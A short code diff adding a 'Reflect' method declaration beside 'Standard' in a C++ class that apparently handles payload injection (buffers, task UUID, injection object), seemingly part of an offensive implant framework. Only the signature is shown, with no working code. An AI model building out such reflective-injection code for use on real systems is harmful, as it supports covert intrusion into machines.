@@ -2001,6 +2001,15 @@ public:
         HANDLE   WriteHandle;
     } Node[15];
 
+    auto Reflect(
+        _In_    BYTE*    Buffer,
+        _In_    SIZE_T   Size,
+        _In_    BYTE*    ArgBuff,
+        _In_    SIZE_T   ArgSize,
+        _In_    CHAR*    TaskUUID,
+        _Inout_ INJ_OBJ* Object
+    ) -> BOOL;
+
     auto Standard(
         _In_    BYTE*    Buffer,
         _In_    SIZE_T   Size,
